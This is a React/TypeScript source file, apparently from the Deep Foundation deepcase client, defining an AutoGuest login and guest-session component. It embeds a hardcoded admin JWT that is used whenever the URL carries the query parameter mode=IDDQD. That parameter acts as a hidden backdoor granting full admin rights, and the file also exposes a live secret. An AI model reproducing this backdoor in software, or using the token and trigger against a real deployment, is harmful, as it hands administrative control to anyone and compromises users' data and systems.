import { useDeep } from "@deep-foundation/deeplinks/imports/client";
import { useTokenController } from "@deep-foundation/deeplinks/imports/react-token";
import React, { useEffect, useRef, useState } from "react";
import Debug from 'debug';
import { useSpaceId } from "./hooks";
import { useEngineConnected } from "./engine";
import { useLocalStore } from "@deep-foundation/store/local";
import { useRouter } from 'next/router'

const debug = Debug('deepcase:auto-guest');

export function AutoGuest({
  children,
}: {
  children: any;
}) {
  const deep = useDeep();
  
  const router = useRouter()
  let [tokenFromController] = useTokenController();
  const token = router.query?.mode === 'IDDQD' ? 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJodHRwczovL2hhc3VyYS5pby9qd3QvY2xhaW1zIjp7IngtaGFzdXJhLWFsbG93ZWQtcm9sZXMiOlsiYWRtaW4iXSwieC1oYXN1cmEtZGVmYXVsdC1yb2xlIjoiYWRtaW4iLCJ4LWhhc3VyYS11c2VyLWlkIjoiMzgwIn0sImlhdCI6MTY5ODMwNjc0Mn0.iv8Ib4GO3TVetf8QJA-c_EssWYe0yfxoDF_qwHiOskQ' : tokenFromController; 
  const ADMIN_LINK_ID = 380;
  if (router.query?.mode === 'IDDQD') deep.login({token, linkId: ADMIN_LINK_ID});
  const [isAuth, setIsAuth] = useState(router.query?.mode === 'IDDQD');

  const [spaceId, setSpaceId] = useSpaceId();
  const [connected, setConnected] = useEngineConnected();
  const [t] = useLocalStore('dc-dg-token', '');
  // console.log({ token, deep, t });
  useEffect(() => {
    // const isAuth = !!(deep.linkId && token && token === deep.token);
    // We use as axiom - deep.token already synced with token
    const isAuth = !!(deep.linkId && token && token === deep.token);
    debug('useCheckAuth', 'token', token, 'deep.token', deep.token, 'isAuth', isAuth);
    // validate
    if (isAuth) (async () => {
      const result = await deep.select({ id: deep.linkId });
      if (!result?.data?.length) {
        debug(`user ${deep.linkId} invalid`);
        deep.logout();
      } else {
        debug(`user ${deep.linkId} valid`);
      }
    })();
    // fill
    if (!token) (async () => {
      const g = await deep.guest();
      console.log('g', g);
      if (g.error) setConnected(false);
    })();
    setIsAuth(isAuth);
  }, [token, deep.linkId]);
  return <>
    {isAuth ? children : null}
  </>
}